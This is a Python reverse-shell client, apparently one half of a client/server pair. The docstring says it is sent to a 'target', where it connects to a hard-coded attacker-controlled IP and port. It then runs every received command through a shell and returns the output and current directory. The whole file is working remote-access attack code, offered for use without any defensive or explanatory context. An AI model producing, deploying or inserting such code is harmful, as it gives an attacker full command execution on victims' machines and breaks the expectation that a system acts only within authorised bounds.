'''
This client.py file is to be send to the target/client. There it is to be exceuted only after the execution of server.py file in the
server. This file basically requsets for connection to the server and the receives commands from there only, executes them and finally 
sends them back again to the server.
'''

#Importing Modules 
import socket #for creating sockets
import subprocess #for running the commands send by server.
import os 
import sys 

#creating a socket and connecting to server
host = '192.168.1.71' #here you should put the static ip of your own server.
port = 1025
s = socket.socket()
s.connect((host , port)) # connecting to server
print('Connected to server.py')

#This while looop allows to receive and run command indifinetly.
while True:
    data = str(s.recv(1024) , 'utf-8')
    if data[:2] == 'cd':
        os.chdir(data[3:])#changes the location to specified directory.

    #If the cmmand from the server is 'exit' or 'close' than socket needs to be closed and system should exit out.
    if data == 'quit' or data == 'exit':
        s.close()
        sys.exit()

    if len(data) > 0:
        cmd = subprocess.Popen(data , shell=True , stdin=subprocess.PIPE , stdout=subprocess.PIPE , stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()#storing the output in bytes form
        output_str = str(output_bytes , 'utf-8')#changing output into string
        cwd = os.getcwd()#getting the surrent working directory of the target/system
        s.send(str.encode(output_str + cwd , 'utf-8'))#sending those info to the server
        print(output_str)#printing out those output.

